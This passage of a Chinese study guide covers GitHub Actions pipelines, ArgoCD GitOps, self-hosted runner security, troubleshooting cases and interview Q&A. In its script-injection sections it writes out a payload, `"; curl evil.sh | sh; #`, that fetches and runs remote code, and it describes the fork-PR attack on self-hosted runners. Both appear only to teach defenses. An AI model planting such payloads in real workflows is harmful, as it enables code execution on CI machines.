          image: ${{ env.IMAGE }}
          tag: ${{ needs.build-push.outputs.tag }}
          gitops-repo: ${{ secrets.GITOPS_REPO }}
          gitops-pat: ${{ secrets.GITOPS_PAT }}
```

**关键理解：`environment: prod` 这一行本身不产生任何审批。**
它只是声明「这个 job 属于 prod 环境」。**真正卡不卡人，是仓库 Settings 决定的**：

> Settings → Environments → prod → 勾 **Required reviewers** → 把自己加进去

**这是 workflow 文件管不到的。** 面试可以展开讲：这个设计是故意的——
**审批策略属于「谁能部署生产」这类治理问题，不该由「能改代码的人」在 YAML 里自己改**。

Environment 还能给：
- **Environment secrets**：同名 secret 在不同环境不同值（dev 连测试库、prod 连生产库）
- **Wait timer**：强制等 N 分钟再跑
- **Deployment branches**：只允许特定分支部署到这个环境

```bash
# 查保护规则有没有真的生效
gh api repos/<OWNER>/<REPO>/environments --jq '.environments[]|{name, protection_rules}'
# 查某次 run 的审批记录
gh api repos/<OWNER>/<REPO>/actions/runs/<RUN_ID>/approvals
```

> ⚠️ **重大坑，详见 Part 6 坑 4**：GitHub Free 账号下，**private 仓库不支持 Environments 保护规则**。
> 把仓库转成 private 会**静默清空**已配好的 required reviewers，`protection_rules` 变成 `[]`，
> 审批门直接失效且**不给任何提示**。

**`if:` 表达式要点：**

- job 级 `if` 决定这个 job 跑不跑；表达式不需要外层 `${{ }}`（写了也行）。
- `github.event.inputs.skip_prod` **只在 `workflow_dispatch` 触发时有值**，push 触发时是空字符串。
  所以判断写 `!= 'true'`（空字符串 != 'true' 成立 → 跑）；
  **不能**写 `== 'false'`（空字符串 != 'false' → push 触发时永远不跑，这是个很隐蔽的 bug）。
- 常用函数：`success()` / `failure()` / `cancelled()` / `always()` / `contains()` / `startsWith()`。
- **每个 job 默认隐含 `if: success()`**，所以上游挂了下游自动跳过。

### prod 有两道闸门（实测流程，别搞混）

这条流水线在 prod 前面有**两个分属不同系统的人工闸门**，面试讲清楚这点很加分：

| 闸门 | 在哪 | 含义 |
|---|---|---|
| ① GitHub Environment 审批 | GitHub 仓库 Settings | **批准发布这个版本**（治理层面的授权） |
| ② ArgoCD 手动 Sync | ArgoCD（`dasher-prod` 的 `syncPolicy` 没配 `automated`） | **真正把它推到生产**（运维层面的执行） |

所以过了 GitHub 审批之后，`verify-prod` 会**一直轮询等你去 ArgoCD 点 Sync**（窗口 420 秒）。
放行命令（二选一）：

```bash
# argocd CLI
multipass exec gitops-labs -- argocd app sync dasher-prod

# 或纯 kubectl（不用登录 argocd CLI）
multipass exec gitops-labs -- kubectl -n argocd patch app dasher-prod --type merge \
  -p '{"operation":{"sync":{"revision":"HEAD"}}}'

# 看状态变化
multipass exec gitops-labs -- kubectl -n argocd get applications
# dasher-dev    Synced      Healthy     ← automated(prune+selfHeal)，自己同步
# dasher-prod   OutOfSync   Healthy     ← 手动，等人点
```

**实测时序**（run 33199602813）：`verify-dev` 轮询 **3分18秒**通过
（正好等到 ArgoCD 的 ~3 分钟 reconcile 周期）；`verify-prod` 因为没人点 Sync
轮询 420 秒超时失败；手动 sync 后 rerun，**10 秒**就绿了。
**这组数字本身就是「为什么不能用 sleep」的最好证据。**

**如果你想让流水线一次跑到底不用人工介入**，把 prod 也改成自动同步
（`dasher-gitops` 的 `argocd-apps/children/dasher-prod.yaml` 加 `syncPolicy.automated`），
这样就只剩 GitHub 审批一道闸门。**两种都是合理设计，取决于你的组织把「执行权」放在哪一层。**

## 3.8 `report`：可复用 workflow（reusable workflow）

**要解决的问题**：结果通知这段逻辑，别的流水线也要用。

被调用方 `.github/workflows/notify-slack.yml` 的关键在 `on: workflow_call`：

```yaml
on:
  workflow_call:
    inputs:
      status: { required: true, type: string }
      tag:    { required: true, type: string }
    # secrets:
    #   SLACK_WEBHOOK: { required: false }
```

调用方：

```yaml
  report:
    name: Report Result (Reusable Workflow)
    needs: [test, build-push, bump-gitops-dev, verify-dev, promote-prod, verify-prod]
    if: always()                  # ← 不管前面成败都要报告
    uses: ./.github/workflows/notify-slack.yml    # ← 注意是 uses，不是 steps
    with:
      status: ${{ contains(needs.*.result, 'failure') && 'failure'
              || (contains(needs.*.result, 'cancelled') && 'cancelled' || 'success') }}
      tag: ${{ needs.build-push.outputs.tag || 'unknown' }}
    secrets: inherit
```

**逐 key 讲：**

- **reusable workflow 在 job 层引用**：写 `uses:` 而**不是** `steps:`。
  这跟 action 不一样（action 在 step 层）。**这是高频混淆点，面试爱问。**
- **`needs.*.result`** —— **对象过滤（object filter）语法**，把 `needs` 这个 map 里每个 job 的
  `.result` 取出来拼成数组，再 `contains(数组, 'failure')` 判断有没有失败的。
- **`&&` / `||` 当三元用** —— GitHub 表达式没有三元运算符，
  `A && B || C` 是标准替代写法（A 真取 B，否则取 C）。
- **`if: always()`** —— 不写的话上游一挂这个 job 直接跳过，**你就收不到失败通知了**。
  这是通知类 job 最经典的错误。
- **`secrets: inherit`** —— 把调用方所有 secret 传给被调用方。更严格是逐个列。
- **限制**：reusable workflow 最多嵌套 4 层。

**reusable workflow vs composite action —— 必考对比：**

| | Composite Action | Reusable Workflow |
|---|---|---|
| 引用层级 | step（`steps: - uses:`） | job（`jobs: x: uses:`） |
| 能定义多个 job | 不能 | **能** |
| 能指定 `runs-on` | 不能（跟着调用方） | **能** |
| secrets | 要通过 inputs 传 | `secrets: inherit` 或声明 |
| 适合 | 封装几步 shell | 封装整段流程 / 多 job |

## 3.9 完整的 job 依赖图

```
test (matrix node 18/20)
   └─> build-push (GHCR, 多架构)
          └─> bump-gitops-dev (env: dev, 直通)
                 └─> verify-dev (self-hosted runner, 只读 curl)
                        └─> promote-prod (env: prod, 审批门)
                               └─> verify-prod (self-hosted runner, 只读 curl)
report (needs 以上全部, if: always())
```

看真实拓扑：`gh run view <RUN_ID> -R <OWNER>/<REPO>`

---

# Part 4 · 自建 Runner 专章

## 4.1 什么场景才真的需要自建 runner

面试官问「你为什么用自建 runner」，**错误答案是「省钱」**（省钱是副作用，不是设计理由）。
正确的四类理由：

| 理由 | 说明 |
|---|---|
| **网络可达性** | GitHub 云端 runner 连不到你的内网/VPC/本机集群。**本实验就是这个理由。** |
| **特殊硬件** | GPU、特定 CPU 架构、大内存、特殊外设 |
| **合规** | 代码/数据不允许离开自有基础设施 |
| **性能** | 有本地缓存、镜像层复用，比每次全新的托管机快 |

**本实验的精确表述**：GitHub 托管 runner 无法 curl 到我本机 k3d 集群的 NodePort，
但「验证部署有没有真的生效」必须从集群侧发起，所以自建 runner **只做部署后的只读冒烟**。

## 4.2 注册：命令行全自动（不用开浏览器）

很多教程（包括本 lab 的旧版脚本）说「注册 token 只能从网页复制」——**这是错的**。
REST API 就能取：

```bash
# 1) 取注册 token（一小时过期，现取现用）
RT=$(gh api -X POST repos/<OWNER>/<REPO>/actions/runners/registration-token --jq .token)

# 2) 注册
cd ~/actions-runner
./config.sh --url https://github.com/<OWNER>/<REPO> \
            --token "$RT" \
            --labels wsl2-k3d,mac-multipass,arm64 \
            --name mac-arm64-runner \
            --work _work \
            --unattended --replace

# 3) 装成 systemd 服务（关终端/重启机器都自动拉起）
sudo ./svc.sh install $(whoami)
sudo ./svc.sh start

# 4) 确认
gh api repos/<OWNER>/<REPO>/actions/runners \
  --jq '.runners[]|{name,status,os,labels:[.labels[].name]}'
# => {"name":"mac-arm64-runner","status":"online","os":"Linux",
#     "labels":["self-hosted","Linux","ARM64","wsl2-k3d","mac-multipass"]}
```

**参数逐个讲：**

- `--labels` —— **逗号分隔，可以给多个**。workflow 的 `runs-on: [self-hosted, wsl2-k3d]`
  要求 runner 同时具备数组里的**每一个**标签。多给几个标签不影响匹配，还方便以后做路由。
- `--name` —— runner 在 GitHub 页面上显示的名字，要能看出是哪台机器。
- `--unattended` —— 不交互提问，全靠参数（脚本化必需）。
- `--replace` —— 同名 runner 已存在就替换（重装时避免报错）。
- `--work _work` —— 工作目录。**注意它会累积 checkout 出来的代码，不是干净环境。**

**runner 放哪很重要**：装在**虚机自己的文件系统**（`~/actions-runner`），
**不要**放在 multipass/NFS 挂载点里。原因：
① systemd 服务开机启动时挂载可能还没就绪；
② runner 会往目录里写 `.runner` / `.credentials` / `_diag` / `_work`，
落到宿主机仓库里会污染你的 git 工作区。

## 4.3 架构必须对上（本实验踩过的真坑）

```bash
uname -m                        # aarch64 = Apple Silicon 虚机
dpkg --print-architecture       # arm64
file ~/actions-runner/bin/Runner.Listener
# => ELF 64-bit LSB pie executable, ARM aarch64   ← 必须跟上面一致
```

下载地址里的架构串：GitHub runner 用 `x64` / `arm64`（**不是** `amd64`）：

```
https://github.com/actions/runner/releases/download/v2.335.1/actions-runner-linux-arm64-2.335.1.tar.gz
                                                                              ^^^^^
```

**脚本里永远别写死架构**：

```bash
ARCH="$(dpkg --print-architecture)"                    # amd64 或 arm64
RUNNER_ARCH="x64"; [ "$ARCH" = "arm64" ] && RUNNER_ARCH="arm64"
```

**⚠️ 更大的坑在镜像那边**：runner 架构对了，不代表你的**应用镜像**在这个架构上能跑。
见 Part 6 坑 3。

## 4.4 安全边界 —— 这一节面试价值最高

### 自建 runner 的核心风险

自建 runner 是**一台会执行「仓库里 workflow 定义的任意代码」的你自己的机器**。
所以：

> **绝对不要把自建 runner 挂在 public 仓库上。**

GitHub 官方明确警告这个组合。攻击路径：任何人 fork 你的仓库 → 改一行 workflow →
提 PR → 你的 runner 上就跑了他的代码，能读本机文件、扫内网、挖矿、拿走你 runner 上的凭证。

### 本实验做的三层防护

1. **仓库转 private**（消灭 fork-PR 攻击面）
   ```bash
   gh repo edit <OWNER>/<REPO> --visibility private --accept-visibility-change-consequences
   ```
   ⚠️ **有代价**，见 Part 6 坑 4。
2. **runner 跑在虚机里**，不是直接跑在 macOS 宿主上——多一层隔离边界。
3. **runner 上的 job 只有 `curl`，没有 `kubectl`**，连 `actions/checkout` 都不做。

### 「为什么不给 runner kubectl 权限」

这是本实验最值得讲的一句话：

> 给自建 runner kubectl 权限，等于给了一台「随时可能执行陌生 workflow 代码」的机器
> 改生产集群的能力。所以部署入口只留 Git 一条，runner 只做只读验证。

### 其他该知道的加固手段

- **ephemeral runner**（`--ephemeral`）：跑完一个 job 就自动注销，每个 job 一个干净环境。
  生产上跑自建 runner 的标准做法（配合 ARC / Actions Runner Controller 在 K8s 里自动扩缩）。
- **`_work` 目录不干净**：自建 runner 是**复用**工作目录的，上一次构建残留的文件还在。
  这跟托管 runner「每次全新虚机」的语义完全不同，是自建 runner 排障的头号疑点。
- **限制哪些 workflow 能用**：Settings → Actions → Runners → runner group（组织级功能）。

## 4.5 排障速查

| 症状 | 查什么 |
|---|---|
| runner 显示 offline | `sudo ./svc.sh status`；`journalctl -u actions.runner.* -n 50` |
| job 一直 queued 不派发 | 标签对不对：`gh api repos/<O>/<R>/actions/runners --jq '.runners[].labels'`；`runs-on` 数组是 AND 语义 |
| runner 列表里空了 | GitHub 会**自动回收长期 offline 的 runner**，重新注册即可 |
| `exec format error` | 架构不对，见 4.3 与 Part 6 坑 3 |
| 上次的文件还在 | `_work` 不是干净环境，需要的话自己 `rm -rf` 或用 `--ephemeral` |

```bash
# 一条命令看 runner 状态
gh api repos/<OWNER>/<REPO>/actions/runners --jq '.runners[]|{name,status,busy,labels:[.labels[].name]}'

# 看服务日志（虚机里）
sudo journalctl -u 'actions.runner.*' -n 80 --no-pager
```

## 4.6 收工与彻底卸载

```bash
# 只停服务（保留注册）
cd ~/actions-runner && sudo ./svc.sh stop

# 彻底注销（从 GitHub 移除）
sudo ./svc.sh uninstall
RT=$(gh api -X POST repos/<OWNER>/<REPO>/actions/runners/remove-token --jq .token)
./config.sh remove --token "$RT"
```

---

# Part 5 · 安全加固（Security Guide 全章）

按「攻击面从大到小」排，这个顺序本身就是答案。

## 5.1 最小权限（Least Privilege）

```yaml
permissions:
  contents: read            # workflow 级默认
# 然后只给需要的 job 单独提权：
jobs:
  build-push:
    permissions:
      contents: read
      packages: write       # 只有这个 job 能推包
```

**再强调一次那个陷阱**：写了 `permissions:` 块，**没列的 scope 全变 `none`**。

## 5.2 凭证分级

| 凭证 | 用在哪 | 为什么是这个 |
|---|---|---|
| `GITHUB_TOKEN` | 推 GHCR | 自动生成、run 结束失效、锁死当前仓库 |
| fine-grained PAT (`GITOPS_PAT`) | push 到 `dasher-gitops` | 跨仓库；**只勾一个仓库 + 只给 Contents:write** |
| **不用** classic PAT | — | classic 的 `repo` scope 是**账号下所有仓库**的读写，一旦泄露全盘皆输 |

**绝不要**把你本机 `gh auth token` 的 OAuth token 当成部署凭证塞进 secret ——
它带着整个账号的 `repo` 权限。

## 5.3 防脚本注入（Script Injection）

**危险写法：**
```yaml
- run: echo "构建分支 ${{ github.event.pull_request.title }}"   # ❌
```
PR 标题是攻击者可控的。`${{ }}` 在 shell 执行**前**做文本替换，标题写成
`"; curl evil.sh | sh; #` 就直接命令执行了。

**正确写法：**
```yaml
- env:
    TITLE: ${{ github.event.pull_request.title }}    # ✅ 先落进环境变量
  run: echo "构建分支 $TITLE"                          #    再用 $VAR 引用
```

**规则**：任何 `${{ }}` 的值都先进 `env:`，脚本里用 `$VAR`。
本实验的 composite action 里 `strenv(IMAGE_NAME)` 就是这个思路在 yq 上的落地。

**高危上下文清单**（这些都是外部可控的）：
`github.event.issue.title` / `.body` / `.comment.body` / `pull_request.title` / `.body` /
`.head.ref`（分支名）/ `head_commit.message` / `.author.email`。

## 5.4 钉住 action 版本

见 2.6。生产建议钉 SHA + Dependabot 自动升级：

`.github/dependabot.yml`
```yaml
version: 2
updates:
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule: { interval: "weekly" }
```

仓库级还能强制要求 SHA 钉版：
```bash
gh api repos/<OWNER>/<REPO>/actions/permissions --jq '.sha_pinning_required'
```

## 5.5 静态扫描（CodeQL）

`.github/workflows/security.yml`：

```yaml
name: CodeQL
on:
  push: { branches: [main] }
  pull_request: { branches: [main] }
  schedule:
    - cron: '30 15 * * 3'          # 每周三定期全量扫（cron 是 UTC！）
permissions:
  security-events: write           # ← 上传扫描结果需要这个
  contents: read
jobs:
  analyze:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v7
      - uses: github/codeql-action/init@v3
        with: { languages: javascript-typescript }
      - uses: github/codeql-action/analyze@v3
```

**要点**：`schedule` 的 cron 是 **UTC 时区**，不是你的本地时区——这是个高频错。
定时任务在默认分支上跑。结果去 Security → Code scanning alerts 看。

## 5.6 加分项：OIDC（面试提一句就够）

流水线要往云上（AWS/Azure/GCP）部署时，**不要存长期 access key**。
用 GitHub Actions 的 **OIDC**：workflow 拿一个短期 JWT，云那边配信任关系换成临时凭证。

```yaml
permissions:
  id-token: write          # ← OIDC 必需
  contents: read
```

面试说法：「长期密钥的问题是泄露后不可感知、轮换成本高。OIDC 是联合身份，
换到的是分钟级临时凭证，而且能在云侧按仓库/分支/环境做条件限制。」

## 5.7 其他

- **secret 不会自动打进日志**：GitHub 会把 secret 值在日志里替换成 `***`，
  但**只对精确匹配生效**——你要是 base64 一下再打印就漏了。
- **fork PR 默认拿不到 secret**（`pull_request` 事件对 fork 不给 secret，`GITHUB_TOKEN` 也降级只读）。
  **但 `pull_request_target` 会给**——这个事件跑在**基仓库**上下文里，
  是最经典的提权漏洞来源，非必要不用。
- **artifact 里别放敏感文件**，它可以被任何有仓库读权限的人下载。

---

# Part 6 · 踩坑实录（面试真正的弹药）

> **这一部分比前面所有部分加起来都值钱。**
> 面试官对「我按教程配好了流水线」毫无兴趣，对「你遇到过什么问题、怎么定位的」极有兴趣。
> 下面每个坑都是这个实验里**真实发生过**的，都附了**一字不差的报错**和**定位路径**。
> 讲的时候按「现象 → 我先怀疑什么 → 怎么排除的 → 根因 → 修法 → 我从中学到的规律」来讲。

## 坑 1 · `Input required and not supplied: token`

**现象**：`test` 和 `build-push` 都绿，`Bump GitOps Tag (dev)` 3 秒就红。

```
X Input required and not supplied: token
  Bump GitOps Tag (dev): .github#34
```

**定位**：报错里的 `token` 不是我自己 job 里的变量名，说明是**某个被调用的 action 的 required input**
没拿到值。顺着 composite action 找过去，`actions/checkout` 的 `token:` 来自
`inputs.gitops-pat`，而它来自 `secrets.GITOPS_PAT`。

```bash
gh secret list -R <OWNER>/dasher-svc
# GITOPS_REPO   2026-07-13     ← 只有这一个！
```

**根因**：仓库只配了 `GITOPS_REPO`，漏了 `GITOPS_PAT`。
**引用一个不存在的 secret 不会报「secret 不存在」，它会静默变成空字符串**，
一路传到 action 那里才以「required input 没给」的形式爆出来。

**修法**：建 fine-grained PAT（只勾 `dasher-gitops` + Contents:write）→ `gh secret set GITOPS_PAT`。

**学到的规律**：
> GitHub Actions 里**引用不存在的 secret 不报错，只给空字符串**。
> 所以配置类问题的报错点，往往离根因隔了好几层。看到 `Input required and not supplied: X`，
> 先反查「X 这个 input 的值是从哪条链路传下来的」，而不是盯着报错那一行看。

## 坑 2 · kustomize 的 `images[].name` 没换成真实 owner —— 静默不更新

**现象**：`Bump GitOps Tag` job **绿的**，但 GitOps 仓库里**没有产生任何 commit**，
`verify-dev` 一直断言线上版本对不上。**全程没有任何报错。**

**根因**：`overlays/dev/kustomization.yaml` 里是模板占位符：

```yaml
images:
  - name: ghcr.io/OWNER/dasher-svc      # ← 字面量 OWNER，没换成真实用户名
    newTag: "0-0000000"
```

而 composite action 传进去的 `image-name` 是 `ghcr.io/qifawu/dasher-svc`（真实 owner）。
于是 yq 的 `select(.name == strenv(IMAGE_NAME))` **匹配到空集合**，
`newTag` 赋值作用在空集合上 → **什么都没改，也不报错**。
接着 `git diff --cached --quiet` 为真 → 走「tag 没变化，跳过 commit」分支 → job 绿。

**要改三个地方，逐字一致**：
`base/deployment.yaml` 的 `image:`、`overlays/dev/kustomization.yaml` 和
`overlays/prod/kustomization.yaml` 的 `images[].name`。

**本地复现/验证的办法**（这个动作面试里讲出来很值钱）：

```bash
# 先看 select 能不能匹配到东西——匹配不到就是空输出
yq '.images[] | select(.name == "ghcr.io/qifawu/dasher-svc")' overlays/dev/kustomization.yaml
```

**学到的规律**：
> **「成功但什么都没发生」比「失败」难查得多。**
> 凡是「按条件筛选再修改」的逻辑（yq/jq 的 select、kubectl 的 label selector、
> sed 的匹配），都要**先单独验证筛选条件命中了东西**，再谈修改。
> 更好的做法是让 action 在匹配不到时**主动失败**，而不是静默跳过。

## 坑 3 · `exec format error` —— 镜像架构不匹配

**现象**：Pod 起不来，`CrashLoopBackOff`，重启 5 次。

```
$ kubectl -n dasher-dev logs deploy/dasher-svc
exec /usr/local/bin/docker-entrypoint.sh: exec format error

$ kubectl -n dasher-dev describe pod ...
  Normal  Pulled  kubelet  Successfully pulled image "ghcr.io/qifawu/dasher-svc:1-37d5998"
  Last State: Terminated   Reason: Error   Exit Code: 255
```

**定位的关键一步**：注意这是 **CrashLoopBackOff 不是 ImagePullBackOff**，
而且 events 里明明白白 `Successfully pulled image`。
**镜像拉下来了、但是跑不起来** → 不是网络/权限问题，是镜像内容和运行环境不匹配。
`exec format error` 是 Linux 内核在「ELF 文件的架构和 CPU 对不上」时的标准报错。

```bash
uname -m        # 集群节点：aarch64
# 查镜像有哪些架构：
TOK=$(curl -s "https://ghcr.io/token?scope=repository:<O>/dasher-svc:pull&service=ghcr.io" \
      | python3 -c 'import sys,json;print(json.load(sys.stdin)["token"])')
curl -s -H "Authorization: Bearer $TOK" \
     -H "Accept: application/vnd.oci.image.index.v1+json" \
     https://ghcr.io/v2/<O>/dasher-svc/manifests/1-37d5998 | python3 -m json.tool
# => 只有 linux/amd64
```

**根因**：GitHub 托管 runner 是 amd64，`docker/build-push-action` 不指定 `platforms`
就只出当前架构。而集群跑在 Apple Silicon 虚机里（arm64）。

**修法**（见 3.3）：加 `setup-qemu` + `setup-buildx` + `platforms: linux/amd64,linux/arm64`。
修完 manifest 变成 OCI image index，两个架构都在：

```
mediaType: application/vnd.oci.image.index.v1+json
  -> linux amd64
  -> linux arm64
```

**学到的规律**：
> **Pod 起不来时，第一件事是区分「拉不到镜像」还是「拉到了跑不起来」**——
> ImagePullBackOff 查网络/认证/tag 拼写，CrashLoopBackOff 查镜像内容/启动命令/配置。
> 而只要开发机和运行环境架构不同（Apple Silicon 现在极其普遍），
> **多架构构建就不是可选项**。

## 坑 4 · ⚠️ 仓库转 private，Environments 保护规则被静默清空

**现象**：`prod` 环境明明配过 required reviewers，但流水线跑到 `promote-prod` **8 秒直接放行**，
完全没有等待审批。

**证据**：

```bash
# 转 private 之前
$ gh api repos/<O>/<R>/environments --jq '.environments[]|{name,protection_rules}'
{"name":"prod","protection_rules":[{"type":"required_reviewers","reviewers":["qifawu"]}]}

# 转 private 之后
{"name":"prod","protection_rules":[]}          # ← 被清空了

$ gh api repos/<O>/<R>/actions/runs/<RUN_ID>/approvals
[]                                              # ← 根本没有审批记录
```

**根因**：**GitHub Free 账号下，Environments 的保护规则（required reviewers / wait timer /
deployment branches）只在 public 仓库可用**。仓库转成 private 后规则被移除，
**且没有任何提示**——UI 上看不出来，workflow 照跑不误。

**这个坑的来龙去脉本身就是好素材**：我是为了消除「自建 runner 挂 public 仓库会被 fork PR
执行任意代码」的风险才转的 private，结果换来了审批门失效。这是一个**真实的安全 vs 功能权衡**。

**三条路：**

| 选择 | 得到 | 失去 |
|---|---|---|
| 转回 public | 审批门；靠关闭 fork + 外部贡献者首次 PR 需审批压风险 | fork-PR 攻击面没彻底消除 |
| 保持 private | 彻底消除 fork-PR 风险 | 审批门，只能用 `workflow_dispatch` 输入或人工分段 rerun 模拟 |
| 升 GitHub Pro | 两者都要 | 每月 $4 |

**学到的规律**：
> **仓库可见性不只是「谁能看见」，它会连带改变一整批功能的可用性**
> （Environments 保护规则、Actions 免费额度、Pages、部分安全功能）。
> 改可见性之前先问一句「我现在依赖的哪些功能是跟可见性绑定的」。

## 坑 5 · `sleep 15` 遇上 ArgoCD 的 3 分钟轮询 —— 必然的假失败

**现象**：`Bump GitOps Tag (dev)` 绿、GitOps 仓库 commit 也有了，
但 `verify-dev` 红：`curl: (52) Empty reply from server` / 版本对不上。
**两分钟后手动 curl，线上版本其实是对的。**

**根因**：verify job 里写的是 `sleep 15` 然后 curl 一次。
而 **ArgoCD 默认的 reconciliation 间隔是 180 秒**——它压根还没去拉 Git。

**修法**：把「死等固定时长」改成「带超时的轮询」（完整代码见 3.6）：

```bash
deadline=$(( $(date +%s) + TIMEOUT_SEC ))     # dev 300s / prod 420s
while [ "$(date +%s)" -lt "$deadline" ]; do
  body=$(curl -fsS --max-time 5 "$URL" 2>/dev/null || true)   # 滚动更新期间连不上是正常的
  actual=$(printf '%s' "$body" | grep -o '"version":"[^"]*"' | cut -d'"' -f4 || true)
  [ "$actual" = "$EXPECT_TAG" ] && { echo "✅"; exit 0; }
  sleep "$INTERVAL_SEC"
done
exit 1
```

**同时要把 job 的 `timeout-minutes` 调到大于轮询窗口**，否则轮询还没跑完 job 先被杀。

**学到的规律**：
> **异步系统之间不能用 `sleep` 对齐。**
> CI 是推式的、ArgoCD 是拉式的，两者没有同步点。正确做法永远是
> **轮询目标状态 + 超时 + 失败时打印排查线索**，而不是猜一个等待时长。
> 猜短了必然假失败（而且是间歇性的，最难查），猜长了每次都白等。

## 坑 6 · ArgoCD `Application referencing project X which does not exist`

**现象**：ArgoCD 的 Application 一直 `Unknown/Unknown`。

```bash
$ kubectl -n argocd get app dasher-dev -o jsonpath='{.status.conditions}'
[{"type":"InvalidSpecError",
  "message":"Application referencing project dasher-project which does not exist"}]

$ kubectl -n argocd get appprojects
NAME      AGE
default   5m         # ← 只有 default
```

**根因**：App-of-Apps 的 root app 只监听 `argocd-apps/children` 这个路径，
而 `AppProject` 的定义放在 `argocd-project/` 目录下——**不在监听范围内，永远不会被同步**。
它属于**一次性 bootstrap 资源**，必须先手动 apply。

```bash
kubectl apply -f argocd-project/*.yaml     # 一次性
```

**学到的规律**：
> **GitOps 里存在「先有鸡还是先有蛋」的 bootstrap 边界**：
> 管理 Application 的东西（AppProject、ArgoCD 本身、集群凭证）不可能由 Application 来管。
> 设计 GitOps 仓库时要明确标出「哪些是 bootstrap 手动跑一次的，哪些是持续同步的」。

## 坑 7 · Node.js 20 废弃告警

**现象**：每次运行页都有一堆黄色 annotation：

```
! Node.js 20 is deprecated. The following actions target Node.js 20 but are being
  forced to run on Node.js 24: actions/checkout@v4, actions/setup-node@v4, ...
```

**根因**：action 的大版本太旧。JS action 在 `action.yml` 里声明 `runs.using: node20`，
GitHub 已经把 runner 的 Node 运行时升到 24，旧 action 被强制跑在 24 上（暂时兼容，但随时可能断）。

**修法**：升到当前最新大版本。查法：

```bash
for a in actions/checkout actions/setup-node actions/upload-artifact \
         docker/login-action docker/build-push-action; do
  printf "%-32s %s\n" "$a" "$(gh api repos/$a/releases/latest --jq .tag_name)"
done
```

**学到的规律**：
> **运行页的 Annotations 区是免费的技术债雷达**，很多人只看红叉不看黄条。
> 黄条今天是 warning，某个版本之后就是硬失败。

---

# Part 7 · 面试问答演练

> 答案都基于**这个项目的真实细节**。面试时说具体数字、具体报错、具体命令，
> 比说概念可信一百倍。

**Q1. `GITHUB_TOKEN` 和 PAT 什么区别？你项目里怎么用的？**
> `GITHUB_TOKEN` 是每次 run 自动生成、run 结束立刻失效的临时凭证，作用域**硬锁在当前仓库**。
> 我用它推 GHCR 镜像，因为 package 属于同一个 owner，配 `permissions: packages: write` 就够。
> 但我的流水线要 push 到**另一个** GitOps 配置仓库，`GITHUB_TOKEN` 跨不过去，
> 必须用 PAT。我用的是 fine-grained PAT，只勾了那一个仓库、只给 Contents: Read and write。
> 我还验证过它的边界：拿这个 PAT 去查主仓库返回 **404**——fine-grained PAT 对没授权的仓库
> 直接当不存在，连 403 都不给。

**Q2. workflow 的 `permissions` 怎么配？**
> 全局 `contents: read`，需要写权限的 job 单独提权。有个坑要注意：
> **一旦写了 `permissions:` 块，没列出来的 scope 全部变成 `none`，不是「保持默认」。**
> 我就因为这个不能开 buildx 的 `cache-to: type=gha`——那个要 `actions: write`，
> 而我的 build job 只声明了 contents 和 packages。
> 另外仓库设置里的「Default workflow permissions」只影响「你没写 `permissions:` 时」的默认值，
> job 里显式声明可以突破它。

**Q3. 为什么 CI 不直接 `kubectl apply`？**
> 三个理由。第一，权限：CI runner 是一台会执行任意分支 workflow 代码的机器，
> 给它 kubectl 凭证等于给任何能提 PR 的人改集群的能力。
> 第二，审计：部署入口唯一化成 Git，谁在什么时候发了哪个版本，`git log` 就是审计日志，
> 不依赖会过期的流水线日志。第三，对账：ArgoCD 持续比对 Git 声明状态和集群实际状态，
> 有人手动改集群会被 selfHeal 拉回来——命令式的 `kubectl set image` 做不到这一点。
> 我的流水线全程零 kubectl，唯一的写操作就是往 GitOps 仓库 commit 一个 tag。

**Q4. 那自建 runner 干什么用？**
> 只做部署后的**只读冒烟验证**。GitHub 托管 runner 连不到我的内网集群，
> 但「验证部署有没有真生效」必须从集群侧发起。所以自建 runner 上那个 job 里
> **只有 curl，没有 kubectl，连 checkout 都不做**——它验证，不部署。
> 这个区分是我这套设计里最核心的安全边界。

**Q5. 自建 runner 有什么风险？你怎么处理的？**
> 最大的风险是**挂在 public 仓库上**：任何人 fork + 改一行 workflow + 提 PR，
> 就能在我的机器上执行任意代码。我做了三层：仓库转 private 消灭 fork-PR 攻击面；
> runner 跑在 Multipass 虚机里而不是宿主机上，多一层隔离；runner 上的 job 只有只读操作。
> 转 private 是有代价的——**GitHub Free 下 private 仓库不支持 Environments 保护规则，
> 我的 prod 审批门被静默清空了**。这是个真实的安全 vs 功能权衡，我把三个选项都评估过。
> 生产环境更规范的做法是 ephemeral runner + Actions Runner Controller，每个 job 一个干净 Pod。

**Q6. matrix 是什么？`include` 和 `exclude` 呢？**
> `strategy.matrix` 把一个 job 按变量组合展开成多个并行 job，多维就是笛卡尔积。
> 我用它在 node 18 和 20 上跑单测。`include` 有两个用法：给已有组合追加变量，
> 或者直接追加一条全新的腿；`exclude` 是从笛卡尔积里剔掉特定组合。
> 我把 `fail-fast` 设成 `false`——默认 true 的话一条腿挂了另一条直接取消，
> 你就不知道是所有版本都挂还是只有某个版本挂，排查价值远大于省那点 CI 时间。

**Q7. composite action 和 reusable workflow 怎么选？**
> 引用层级不一样：composite action 在 **step** 层（`steps: - uses:`），
> reusable workflow 在 **job** 层（`jobs: x: uses:`）。
> composite 不能定义多个 job、不能指定 `runs-on`，跟着调用方跑；
> reusable workflow 可以，还能 `secrets: inherit`。
> 我的「改 GitOps 仓库 tag」是几步 shell + 一个 checkout，dev/prod 各调一次，
> 所以用 composite；结果通知那段是独立的一个 job，用 reusable workflow。
> composite 有个细节：**里面每个 `run:` 都必须显式写 `shell:`**，普通 workflow 里可以省。

**Q8. 你怎么挑 action？怎么保证供应链安全？**
> 六条：看维护方是不是官方组织或 Verified creator、看最近发版日期和 issue 响应、
> 看 `action.yml` 里的 `runs.using` 有没有用废弃的运行时、看它要什么权限、
> **读 `action.yml` 而不是 README**（README 经常过期）、
> 最后问一句「这事三行 `run:` 能不能搞定」——能就别引依赖。
> 版本上，学习项目用 `@v7` 这种大版本，生产钉 commit SHA + Dependabot 自动升级，
> 因为 tag 是可变引用，攻击者拿到仓库权限可以把 `v4` 重新指向恶意 commit。
> 2025 年 `tj-actions/changed-files` 被投毒就是走的这条路。

**Q9. 什么是脚本注入？怎么防？**
> `${{ }}` 是在 shell 执行**之前**做纯文本替换的。如果你写
> `run: echo "${{ github.event.pull_request.title }}"`，
> 攻击者把 PR 标题改成 `"; curl evil.sh | sh; #` 就直接在 runner 上拿到命令执行。
> 防法是**把值先放进 `env:`，脚本里用 `$VAR` 引用**——环境变量是运行时传的，不参与文本替换。
> 我的 composite action 里改 YAML 那步就是这么做的，用 yq 的 `strenv()` 读环境变量，
> 而不是把 input 拼进表达式字符串。

